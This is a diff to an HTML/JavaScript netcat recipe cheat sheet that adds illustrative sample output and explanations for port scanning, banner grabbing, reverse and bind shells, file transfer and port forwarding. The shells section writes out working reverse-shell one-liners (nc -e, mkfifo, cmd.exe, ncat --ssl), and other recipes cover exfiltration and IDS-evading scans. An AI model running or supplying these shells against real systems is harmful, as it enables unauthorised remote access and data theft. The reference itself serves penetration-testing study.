@@ -163,6 +163,8 @@ header{position:sticky;top:0;z-index:9999;background:rgba(10,14,19,.97);backdrop
 .dpre .kw{color:#79c0ff;font-weight:700}
 .dpre .fl{color:#ffa657;font-weight:600}
 .dpre .tgt{color:#f85149;font-weight:700}
+.outblk{border-top:2px solid #e3b34140}
+.outpre{color:#8b949e;font-size:.75rem}
 .ptog{display:flex;align-items:center;justify-content:space-between;background:var(--s2);
   border:1px solid var(--b1);border-radius:var(--rs);padding:.34rem .65rem;
   font-size:.7rem;color:var(--mut);cursor:pointer;transition:all .14s;width:100%;text-align:left}
@@ -221,7 +223,7 @@ footer a:hover{text-decoration:underline}
     </div>
   </div>
   <div class="hbadges">
-    <span class="hb g">&#10003; 60+ Recipes</span>
+    <span class="hb g">&#10003; 40 Recipes + Sample Output</span>
     <span class="hb b">&#128274; Port Scanning</span>
     <span class="hb y">&#128736; Banner Grabbing</span>
     <span class="hb p">&#128640; Reverse Shells</span>
@@ -297,12 +299,12 @@ var CATS = [
    {f:"-z",d:"Zero I/O mode (port scan)"}
  ],
  cmds:[
-   {l:"Connect to TCP port",r:"low",c:"nc -vn {T} 80",e:"Connects to target on port 80. Once connected, you can send HTTP requests manually. Great for banner grabbing and manual protocol testing."},
-   {l:"Listen on TCP port",r:"medium",c:"nc -lvnp 4444",e:"Starts a listener on port 4444. Useful for receiving reverse shells or files. The -v flag shows connection details."},
-   {l:"Send a file",r:"high",c:"nc -w 3 {T} 1234 < file.txt",e:"Sends file.txt to target on port 1234. Must be paired with a listener on the receiving end."},
-   {l:"Receive a file",r:"high",c:"nc -lvnp 1234 > received.txt",e:"Listens on port 1234 and saves incoming data to received.txt. Perfect for exfil or file transfers."},
-   {l:"Timeout after N seconds",r:"low",c:"nc -w 5 {T} 80",e:"Sets connection timeout to 5 seconds. Useful in scripts to avoid hanging."},
-   {l:"UDP mode",r:"medium",c:"nc -u {T} 53",e:"Uses UDP instead of TCP. Test DNS (port 53) or other UDP services."}
+   {l:"Connect to TCP port",r:"low",c:"nc -vn {T} 80",e:"Connects to target on port 80. Once connected, you can send HTTP requests manually. Great for banner grabbing and manual protocol testing.",o:"$ nc -vn {T} 80\n(UNKNOWN) [{T}] 80 (http) open",oe:"'open' confirms port 80 accepted the TCP connection. You're now in an interactive session — type an HTTP request manually to see what comes back."},
+   {l:"Listen on TCP port",r:"medium",c:"nc -lvnp 4444",e:"Starts a listener on port 4444. Useful for receiving reverse shells or files. The -v flag shows connection details.",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 51244",oe:"The first line confirms the listener is up. The second line only appears once something actually connects — proof inbound traffic reached your port."},
+   {l:"Send a file",r:"high",c:"nc -w 3 {T} 1234 < file.txt",e:"Sends file.txt to target on port 1234. Must be paired with a listener on the receiving end.",o:"$ nc -w 3 {T} 1234 < file.txt\n$",oe:"Netcat stays silent on success. No output means the file streamed and the connection closed cleanly after the 3s timeout — check the receiving end to confirm it landed."},
+   {l:"Receive a file",r:"high",c:"nc -lvnp 1234 > received.txt",e:"Listens on port 1234 and saves incoming data to received.txt. Perfect for exfil or file transfers.",o:"$ nc -lvnp 1234 > received.txt\nlistening on [any] 1234 ...\nconnect to [10.0.0.5] from {T} [{T}] 49871",oe:"Confirms a sender connected and data is being written to received.txt. Run 'ls -l received.txt' afterward to verify the full file arrived."},
+   {l:"Timeout after N seconds",r:"low",c:"nc -w 5 {T} 80",e:"Sets connection timeout to 5 seconds. Useful in scripts to avoid hanging.",o:"$ nc -w 5 {T} 80\n$",oe:"No banner, no error — HTTP servers don't send anything until you ask. The command simply exits after 5 seconds since nothing was received."},
+   {l:"UDP mode",r:"medium",c:"nc -u {T} 53",e:"Uses UDP instead of TCP. Test DNS (port 53) or other UDP services.",o:"$ nc -u {T} 53\n$",oe:"UDP is connectionless, so netcat can't confirm anything is 'open' by itself — you'll only see a response if the service actually replies to what you send."}
  ]
 },
 {id:"scanning",icon:"&#128269;",badge:"b-manverify",
@@ -316,11 +318,11 @@ var CATS = [
    {f:"-w <sec>",d:"Connect timeout per port"}
  ],
  cmds:[
-   {l:"Scan single port",r:"low",c:"nc -zv -w 1 {T} 80",e:"Checks if port 80 is open. -z prevents sending data, -v shows result, -w 1 times out after 1 second."},
-   {l:"Scan multiple ports",r:"medium",c:"nc -zv -w 1 {T} 22 80 443 8080",e:"Scans a list of specific ports. Reports which are open/closed."},
-   {l:"Scan port range",r:"high",c:"for port in $(seq 1 1024); do nc -zv -w 1 {T} $port 2>&1 | grep succeeded; done",e:"Bash loop to scan ports 1-1024. Slower but works on any system with netcat."},
-   {l:"UDP port scan",r:"high",c:"nc -zvu -w 1 {T} 53 67 68 69",e:"Scans common UDP ports. UDP scanning is less reliable due to connectionless nature."},
-   {l:"Randomized port scan",r:"medium",c:"nc -zv -r -w 1 {T} 1-1000",e:"Scans ports 1-1000 in random order. May evade simple intrusion detection."}
+   {l:"Scan single port",r:"low",c:"nc -zv -w 1 {T} 80",e:"Checks if port 80 is open. -z prevents sending data, -v shows result, -w 1 times out after 1 second.",o:"$ nc -zv -w 1 {T} 80\nConnection to {T} 80 port [tcp/http] succeeded!",oe:"'succeeded' means the port is open and something is listening. A closed port would instead say 'Connection refused'."},
+   {l:"Scan multiple ports",r:"medium",c:"nc -zv -w 1 {T} 22 80 443 8080",e:"Scans a list of specific ports. Reports which are open/closed.",o:"$ nc -zv -w 1 {T} 22 80 443 8080\nConnection to {T} 22 port [tcp/ssh] succeeded!\nnc: connect to {T} port 80 (tcp) failed: Connection refused\nConnection to {T} 443 port [tcp/https] succeeded!\nnc: connect to {T} port 8080 (tcp) timed out: Operation now in progress",oe:"One line per port: 'succeeded' = open, 'refused' = closed but reachable, 'timed out' = likely blocked by a firewall rather than simply closed."},
+   {l:"Scan port range",r:"high",c:"for port in $(seq 1 1024); do nc -zv -w 1 {T} $port 2>&1 | grep succeeded; done",e:"Bash loop to scan ports 1-1024. Slower but works on any system with netcat.",o:"$ for port in $(seq 1 1024); do nc -zv -w 1 {T} $port 2>&1 | grep succeeded; done\nConnection to {T} 22 port [tcp/ssh] succeeded!\nConnection to {T} 80 port [tcp/http] succeeded!\nConnection to {T} 443 port [tcp/https] succeeded!",oe:"The grep filters out all the noise so only open ports print. Here, 3 out of 1024 ports responded — those are your points of interest."},
+   {l:"UDP port scan",r:"high",c:"nc -zvu -w 1 {T} 53 67 68 69",e:"Scans common UDP ports. UDP scanning is less reliable due to connectionless nature.",o:"$ nc -zvu -w 1 {T} 53 67 68 69\nConnection to {T} 53 port [udp/domain] succeeded!\nnc: connect to {T} port 67 (udp) failed: Connection refused",oe:"UDP results are inherently unreliable — 'succeeded' just means no ICMP unreachable came back, not that a service is confirmed listening there."},
+   {l:"Randomized port scan",r:"medium",c:"nc -zv -r -w 1 {T} 1-1000",e:"Scans ports 1-1000 in random order. May evade simple intrusion detection.",o:"$ nc -zv -r -w 1 {T} 1-1000\nConnection to {T} 443 port [tcp/https] succeeded!\nConnection to {T} 22 port [tcp/ssh] succeeded!",oe:"Same open ports as a sequential scan, just discovered in random order — useful for blending in with normal background traffic."}
  ]
 },
 {id:"banners",icon:"&#128220;",badge:"b-cveresearch",
@@ -333,12 +335,12 @@ var CATS = [
    {f:"-n",d:"Skip DNS (faster)"}
  ],
  cmds:[
-   {l:"HTTP server banner",r:"high",c:"echo 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc {T} 80 | head -10",e:"Connects to web server, sends HTTP HEAD request, and displays first 10 lines of response – reveals Server header."},
-   {l:"SMTP banner",r:"high",c:"nc -vn {T} 25",e:"Connects to SMTP port and reads welcome banner. Often reveals mail server software and version."},
-   {l:"SSH banner",r:"critical",c:"nc -vn {T} 22",e:"Connects to SSH port and reads protocol banner (e.g., SSH-2.0-OpenSSH_8.9p1). Essential for version matching."},
-   {l:"FTP banner",r:"medium",c:"nc -vn {T} 21",e:"Connects to FTP server and grabs welcome banner. Identifies vsftpd, ProFTPD, etc."},
-   {l:"POP3 banner",r:"medium",c:"nc -vn {T} 110",e:"Connects to POP3 mail server and reads banner. Often reveals mail server type and version."},
-   {l:"Custom banner grab",r:"high",c:"echo 'HELP\\r\\n' | nc {T} 25",e:"Sends custom command after connecting. Useful for extracting more info from SMTP, FTP, etc."}
+   {l:"HTTP server banner",r:"high",c:"echo 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc {T} 80 | head -10",e:"Connects to web server, sends HTTP HEAD request, and displays first 10 lines of response – reveals Server header.",o:"$ echo 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc {T} 80 | head -10\nHTTP/1.1 200 OK\nServer: nginx/1.24.0\nDate: Tue, 05 Aug 2025 10:12:03 GMT\nContent-Type: text/html",oe:"The 'Server' header is the prize — it names the exact web server and version, the first thing to check against known CVEs."},
+   {l:"SMTP banner",r:"high",c:"nc -vn {T} 25",e:"Connects to SMTP port and reads welcome banner. Often reveals mail server software and version.",o:"$ nc -vn {T} 25\nConnection to {T} 25 port [tcp/smtp] succeeded!\n220 mail.{T} ESMTP Postfix (Ubuntu)",oe:"The '220' line is the mail server's welcome banner — it usually names the software (Postfix, Exim, Sendmail) and sometimes the OS."},
+   {l:"SSH banner",r:"critical",c:"nc -vn {T} 22",e:"Connects to SSH port and reads protocol banner (e.g., SSH-2.0-OpenSSH_8.9p1). Essential for version matching.",o:"$ nc -vn {T} 22\nConnection to {T} 22 port [tcp/ssh] succeeded!\nSSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3",oe:"One line tells you the SSH protocol version and exact OpenSSH build — essential for matching against known vulnerabilities."},
+   {l:"FTP banner",r:"medium",c:"nc -vn {T} 21",e:"Connects to FTP server and grabs welcome banner. Identifies vsftpd, ProFTPD, etc.",o:"$ nc -vn {T} 21\nConnection to {T} 21 port [tcp/ftp] succeeded!\n220 (vsFTPd 3.0.5)",oe:"Confirms vsftpd and its version — worth checking whether that release has any known auth-bypass or backdoor advisories."},
+   {l:"POP3 banner",r:"medium",c:"nc -vn {T} 110",e:"Connects to POP3 mail server and reads banner. Often reveals mail server type and version.",o:"$ nc -vn {T} 110\nConnection to {T} 110 port [tcp/pop3] succeeded!\n+OK Dovecot ready.",oe:"'+OK' is POP3's standard greeting; 'Dovecot' identifies the mail software answering behind it."},
+   {l:"Custom banner grab",r:"high",c:"echo 'HELP\\r\\n' | nc {T} 25",e:"Sends custom command after connecting. Useful for extracting more info from SMTP, FTP, etc.",o:"$ echo 'HELP\\r\\n' | nc {T} 25\n220 mail.{T} ESMTP Postfix\n214-Commands supported:\n214-AUTH DATA EHLO HELO MAIL NOOP QUIT RCPT RSET",oe:"The HELP command lists every SMTP verb the server supports — a quick way to spot older or less hardened mail implementations."}
  ]
 },
 {id:"shells",icon:"&#128640;",badge:"b-misconfig",
@@ -351,12 +353,12 @@ var CATS = [
    {f:"-c <prog>",d:"Execute program (OpenBSD nc)"}
  ],
  cmds:[
-   {l:"Reverse shell (Linux target)",r:"critical",c:"nc -e /bin/bash {T} 4444",e:"Target connects back to attacker IP on port 4444 and provides a bash shell. Attacker must be listening: nc -lvnp 4444"},
-   {l:"Reverse shell (OpenBSD netcat)",r:"critical",c:"nc -c /bin/bash {T} 4444",e:"OpenBSD version uses -c instead of -e. Same concept: target connects back to attacker."},
-   {l:"Bind shell (Linux target)",r:"critical",c:"nc -lvnp 4444 -e /bin/bash",e:"Target opens port 4444 and waits for connection. Attacker connects with: nc -vn {T} 4444"},
-   {l:"Reverse shell (no -e) with mkfifo",r:"critical",c:"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {T} 4444 > /tmp/f",e:"Works on systems where netcat lacks -e. Uses named pipe to create interactive shell."},
-   {l:"Windows reverse shell",r:"critical",c:"nc -e cmd.exe {T} 4444",e:"Target Windows machine connects back to attacker with cmd.exe shell. Requires netcat for Windows."},
-   {l:"Encrypted reverse shell (ncat)",r:"critical",c:"ncat --ssl -e /bin/bash {T} 4444",e:"Uses ncat (Nmap's netcat) with SSL encryption – evades plaintext detection."}
+   {l:"Reverse shell (Linux target)",r:"critical",c:"nc -e /bin/bash {T} 4444",e:"Target connects back to attacker IP on port 4444 and provides a bash shell. Attacker must be listening: nc -lvnp 4444",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 42110\nwhoami\nwww-data",oe:"Once the target connects back, you land directly in a shell there — anything you type executes on the target and streams back to you."},
+   {l:"Reverse shell (OpenBSD netcat)",r:"critical",c:"nc -c /bin/bash {T} 4444",e:"OpenBSD version uses -c instead of -e. Same concept: target connects back to attacker.",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 42117",oe:"Functionally identical result to -e — the only difference is which netcat build supports the flag."},
+   {l:"Bind shell (Linux target)",r:"critical",c:"nc -lvnp 4444 -e /bin/bash",e:"Target opens port 4444 and waits for connection. Attacker connects with: nc -vn {T} 4444",o:"$ nc -vn {T} 4444\nConnection to {T} 4444 port [tcp/*] succeeded!\nwhoami\nroot",oe:"This time you're connecting outward — the target already has a shell waiting for you on port 4444."},
+   {l:"Reverse shell (no -e) with mkfifo",r:"critical",c:"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {T} 4444 > /tmp/f",e:"Works on systems where netcat lacks -e. Uses named pipe to create interactive shell.",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 42200\n$",oe:"The named pipe keeps stdin/stdout properly linked, giving a cleaner interactive prompt than the plain -e method."},
+   {l:"Windows reverse shell",r:"critical",c:"nc -e cmd.exe {T} 4444",e:"Target Windows machine connects back to attacker with cmd.exe shell. Requires netcat for Windows.",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 51322\nMicrosoft Windows [Version 10.0.19045.4046]\nC:\\>",oe:"The banner confirms it's a Windows host and drops you at a standard cmd.exe prompt."},
+   {l:"Encrypted reverse shell (ncat)",r:"critical",c:"ncat --ssl -e /bin/bash {T} 4444",e:"Uses ncat (Nmap's netcat) with SSL encryption – evades plaintext detection.",o:"$ ncat --ssl -lvnp 4444\nNcat: Generating a temporary 2048-bit RSA key.\nNcat: SHA-1 fingerprint: A1:B2:C3:D4:...\nNcat: Listening on [any] 4444\nNcat: Connection from {T}.",oe:"Ncat auto-generates a TLS cert so the session is encrypted — the fingerprint line confirms SSL negotiated successfully."}
  ]
 },
 {id:"filetransfer",icon:"&#128230;",badge:"b-authn",
@@ -369,12 +371,12 @@ var CATS = [
    {f:"-q <sec>",d:"Quit after EOF (some versions)"}
  ],
  cmds:[
-   {l:"Send file (receiver listens)",r:"high",c:"nc -lvnp 1234 > received.zip",e:"On receiving machine: listen and save to file."},
-   {l:"Send file (sender pushes)",r:"high",c:"nc -w 3 {T} 1234 < file.zip",e:"On sending machine: push file to receiver. -w ensures netcat exits after transfer."},
-   {l:"Directory transfer (tar)",r:"high",c:"tar cf - /path/to/dir | nc {T} 1234",e:"Streams entire directory as tar archive. On receiver: nc -lvnp 1234 | tar xvf -"},
-   {l:"Encrypted transfer (ncat)",r:"critical",c:"ncat --ssl -lvnp 1234 > secret.zip",e:"Receiver with SSL encryption. Sender: ncat --ssl {T} 1234 < secret.zip"},
-   {l:"Progress indicator (pv)",r:"medium",c:"tar cf - /dir | pv | nc {T} 1234",e:"Uses 'pv' (pipe viewer) to show transfer progress and speed."},
-   {l:"Multiple files (zip)",r:"high",c:"zip -r - files/ | nc {T} 1234",e:"Streams multiple files as zip archive. Receiver: nc -lvnp 1234 > files.zip"}
+   {l:"Send file (receiver listens)",r:"high",c:"nc -lvnp 1234 > received.zip",e:"On receiving machine: listen and save to file.",o:"$ nc -lvnp 1234 > received.zip\nlistening on [any] 1234 ...\nconnect to [10.0.0.5] from {T} [{T}] 55210",oe:"Once the connection closes, check the file size with 'ls -l received.zip' to confirm the full transfer landed."},
+   {l:"Send file (sender pushes)",r:"high",c:"nc -w 3 {T} 1234 < file.zip",e:"On sending machine: push file to receiver. -w ensures netcat exits after transfer.",o:"$ nc -w 3 {T} 1234 < file.zip\n$",oe:"Silent by design — success is measured on the receiving end. No error here just means your local netcat finished sending."},
+   {l:"Directory transfer (tar)",r:"high",c:"tar cf - /path/to/dir | nc {T} 1234",e:"Streams entire directory as tar archive. On receiver: nc -lvnp 1234 | tar xvf -",o:"$ tar cf - /path/to/dir | nc {T} 1234\n$",oe:"No local output; the receiver's 'tar xvf -' will list every extracted filename as proof the archive arrived intact."},
+   {l:"Encrypted transfer (ncat)",r:"critical",c:"ncat --ssl -lvnp 1234 > secret.zip",e:"Receiver with SSL encryption. Sender: ncat --ssl {T} 1234 < secret.zip",o:"$ ncat --ssl -lvnp 1234 > secret.zip\nNcat: Generating a temporary 2048-bit RSA key.\nNcat: Listening on [any] 1234\nNcat: Connection from {T}.",oe:"Same connection confirmation as any ncat listener, but the traffic itself is now encrypted end to end."},
+   {l:"Progress indicator (pv)",r:"medium",c:"tar cf - /dir | pv | nc {T} 1234",e:"Uses 'pv' (pipe viewer) to show transfer progress and speed.",o:"$ tar cf - /dir | pv | nc {T} 1234\n 128MiB 0:00:14 [9.1MiB/s] [   <=>            ]",oe:"pv adds a live throughput readout — total sent, elapsed time, and current speed — so you're not transferring blind."},
+   {l:"Multiple files (zip)",r:"high",c:"zip -r - files/ | nc {T} 1234",e:"Streams multiple files as zip archive. Receiver: nc -lvnp 1234 > files.zip",o:"$ zip -r - files/ | nc {T} 1234\n  adding: files/report.pdf (deflated 12%)\n  adding: files/notes.txt (deflated 40%)",oe:"Zip lists each file as it's compressed into the stream — a quick sanity check that the right files are going out."}
  ]
 },
 {id:"chat",icon:"&#128172;",badge:"b-bizlogic",
@@ -387,9 +389,9 @@ var CATS = [
    {f:"-p <port>",d:"Port number"}
  ],
  cmds:[
-   {l:"Start chat server",r:"low",c:"nc -lvnp 4444",e:"Machine A starts listening. Machine B connects: nc -vn {T} 4444. Type and talk."},
-   {l:"Chat with persistent connection",r:"low",c:"while true; do nc -lvnp 4444; done",e:"Restarts chat server after each client disconnects. Allows multiple sequential chats."},
-   {l:"Group chat (UDP broadcast)",r:"medium",c:"nc -u -lvnp 4444",e:"UDP broadcast chat. Multiple clients can connect (sort of) – not reliable but fun."}
+   {l:"Start chat server",r:"low",c:"nc -lvnp 4444",e:"Machine A starts listening. Machine B connects: nc -vn {T} 4444. Type and talk.",o:"$ nc -lvnp 4444\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 60213\nhey, you there?",oe:"After the connection banner, anything either side types appears on the other's screen in real time."},
+   {l:"Chat with persistent connection",r:"low",c:"while true; do nc -lvnp 4444; done",e:"Restarts chat server after each client disconnects. Allows multiple sequential chats.",o:"$ while true; do nc -lvnp 4444; done\nlistening on [any] 4444 ...\nconnect to [10.0.0.5] from {T} [{T}] 60300",oe:"Each time a chat session ends, the loop immediately reopens the listener — a fresh 'listening on' line appears for every new session."},
+   {l:"Group chat (UDP broadcast)",r:"medium",c:"nc -u -lvnp 4444",e:"UDP broadcast chat. Multiple clients can connect (sort of) – not reliable but fun.",o:"$ nc -u -lvnp 4444\nlistening on [any] 4444 ...",oe:"UDP has no real 'connect' event, so there's no connection log — messages simply start appearing as datagrams arrive."}
  ]
 },
 {id:"proxies",icon:"&#128736;",badge:"b-ratelimit",
@@ -402,9 +404,9 @@ var CATS = [
    {f:"-C",d:"Send CRLF as line-ending"}
  ],
  cmds:[
-   {l:"Simple port forward",r:"high",c:"mkfifo /tmp/fifo; cat /tmp/fifo | nc -lvnp 8080 | nc {T} 80 > /tmp/fifo",e:"Listens on port 8080 and forwards all traffic to target port 80. Responses come back through fifo."},
-   {l:"HTTP proxy (single connection)",r:"high",c:"nc -lvnp 8888 -c 'nc {T} 80'",e:"Some netcat versions support -c for command. Forwards one connection to target."},
-   {l:"Multi-client forward (ncat)",r:"high",c:"ncat --sh-exec \"ncat {T} 80\" -lvnp 8888 --keep-open",e:"Nmap's ncat with --keep-open handles multiple clients. Forwards to target web server."}
+   {l:"Simple port forward",r:"high",c:"mkfifo /tmp/fifo; cat /tmp/fifo | nc -lvnp 8080 | nc {T} 80 > /tmp/fifo",e:"Listens on port 8080 and forwards all traffic to target port 80. Responses come back through fifo.",o:"$ mkfifo /tmp/fifo; cat /tmp/fifo | nc -lvnp 8080 | nc {T} 80 > /tmp/fifo\nlistening on [any] 8080 ...\nconnect to [10.0.0.5] from 127.0.0.1 [127.0.0.1] 51500",oe:"Confirms a client hit your forwarder on 8080; traffic is now relayed to {T}:80 and the response piped back through the fifo."},
+   {l:"HTTP proxy (single connection)",r:"high",c:"nc -lvnp 8888 -c 'nc {T} 80'",e:"Some netcat versions support -c for command. Forwards one connection to target.",o:"$ nc -lvnp 8888 -c 'nc {T} 80'\nlistening on [any] 8888 ...",oe:"Handles exactly one client before exiting — you'll only see a second 'listening' line if you rerun the command."},
+   {l:"Multi-client forward (ncat)",r:"high",c:"ncat --sh-exec \"ncat {T} 80\" -lvnp 8888 --keep-open",e:"Nmap's ncat with --keep-open handles multiple clients. Forwards to target web server.",o:"$ ncat --sh-exec \"ncat {T} 80\" -lvnp 8888 --keep-open\nNcat: Listening on [any] 8888\nNcat: Connection from 10.0.0.12.\nNcat: Connection from 10.0.0.14.",oe:"--keep-open lets ncat log multiple simultaneous clients instead of exiting after the first one disconnects."}
  ]
 },
 {id:"debug",icon:"&#128295;",badge:"b-priority",
@@ -418,11 +420,11 @@ var CATS = [
    {f:"-s <ip>",d:"Bind to specific source IP"}
  ],
  cmds:[
-   {l:"Test outbound connectivity",r:"low",c:"nc -zv -w 3 8.8.8.8 53",e:"Checks if you can reach Google's DNS on port 53. Great for firewall testing."},
-   {l:"Bind to specific source IP",r:"medium",c:"nc -s 192.168.1.100 -zv {T} 22",e:"Forces netcat to use specific source IP. Tests multi-homed configurations."},
-   {l:"Measure connection time",r:"low",c:"time nc -zv -w 3 {T} 22",e:"Times how long the connection attempt takes. Helps identify latency or timeout issues."},
-   {l:"Test UDP connectivity",r:"medium",c:"nc -zvu -w 3 {T} 53",e:"Tests UDP port 53 (DNS). Useful for checking if UDP is blocked."},
-   {l:"Send raw HTTP request",r:"high",c:"printf 'GET / HTTP/1.0\\r\\nHost: {T}\\r\\n\\r\\n' | nc {T} 80 | head -20",e:"Manually crafts HTTP request. Debug web server responses."}
+   {l:"Test outbound connectivity",r:"low",c:"nc -zv -w 3 8.8.8.8 53",e:"Checks if you can reach Google's DNS on port 53. Great for firewall testing.",o:"$ nc -zv -w 3 8.8.8.8 53\nConnection to 8.8.8.8 53 port [tcp/domain] succeeded!",oe:"Confirms outbound TCP on port 53 isn't blocked locally — useful when diagnosing why a service can't reach the internet."},
+   {l:"Bind to specific source IP",r:"medium",c:"nc -s 192.168.1.100 -zv {T} 22",e:"Forces netcat to use specific source IP. Tests multi-homed configurations.",o:"$ nc -s 192.168.1.100 -zv {T} 22\nConnection to {T} 22 port [tcp/ssh] succeeded!",oe:"Same success message as a normal scan, but now verified specifically over the 192.168.1.100 interface."},
+   {l:"Measure connection time",r:"low",c:"time nc -zv -w 3 {T} 22",e:"Times how long the connection attempt takes. Helps identify latency or timeout issues.",o:"$ time nc -zv -w 3 {T} 22\nConnection to {T} 22 port [tcp/ssh] succeeded!\n\nreal    0m0.042s\nuser    0m0.004s\nsys     0m0.003s",oe:"'real' is what matters — 42ms is a healthy local response; a time close to your -w timeout suggests latency or filtering."},
+   {l:"Test UDP connectivity",r:"medium",c:"nc -zvu -w 3 {T} 53",e:"Tests UDP port 53 (DNS). Useful for checking if UDP is blocked.",o:"$ nc -zvu -w 3 {T} 53\nConnection to {T} 53 port [udp/domain] succeeded!",oe:"No error means the packet went out without an immediate ICMP rejection — a good sign, though not a full guarantee."},
+   {l:"Send raw HTTP request",r:"high",c:"printf 'GET / HTTP/1.0\\r\\nHost: {T}\\r\\n\\r\\n' | nc {T} 80 | head -20",e:"Manually crafts HTTP request. Debug web server responses.",o:"$ printf 'GET / HTTP/1.0\\r\\nHost: {T}\\r\\n\\r\\n' | nc {T} 80 | head -20\nHTTP/1.1 200 OK\nServer: Apache/2.4.58\nContent-Type: text/html; charset=UTF-8",oe:"You're seeing exactly what the web server returns — status code, server software, and headers — before any browser processing."}
  ]
 }
 ];
@@ -452,6 +454,7 @@ function cleanTarget(t) {
   return t.trim().split(/\s+/)[0]; // Take first token as host
 }
 function fillCmd(c) { return c.replace(/\{T\}/g, TARGET); }
+function fillOut(o) { return o.replace(/\{T\}/g, TARGET || "TARGET"); }
 function totalCmds() {
   var n = 0;
   for (var i = 0; i < CATS.length; i++) { n += CATS[i].cmds.length; }
@@ -693,6 +696,26 @@ function buildCard(cat, cm, uid) {
   h += "</div></div>";
   h += '<pre class="dpre">'+colorize(cm.c)+"</pre>";
   h += "</div>";
+  if (cm.o) {
+    var obid = "out_"+uid;
+    h += '<div class="dblk outblk" id="'+obid+'">';
+    h += '<div class="dbar">';
+    h += '<div class="dbar-l">';
+    h += '<div class="dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>';
+    h += '<span style="font-family:var(--mono);font-size:.66rem;color:var(--mut)">sample output</span>';
+    h += "</div>";
+    h += '<div class="dbar-r">';
+    h += '<button class="cbtn" onclick="copyFromBlock(\''+obid+'\',this)">Copy</button>';
+    h += "</div></div>";
+    h += '<pre class="dpre outpre">'+esc(fillOut(cm.o))+"</pre>";
+    h += "</div>";
+  }
+  if (cm.oe) {
+    h += '<div class="what">';
+    h += '<div class="wlbl">Reading The Output</div>';
+    h += esc(cm.oe);
+    h += "</div>";
+  }
   if (cat.flags && cat.flags.length) {
     h += '<button class="ptog" id="'+togid+'" onclick="togParams(\''+ptid+'\',\''+togid+'\')">';
     h += "<span>Flags Reference ("+cat.flags.length+")</span>";
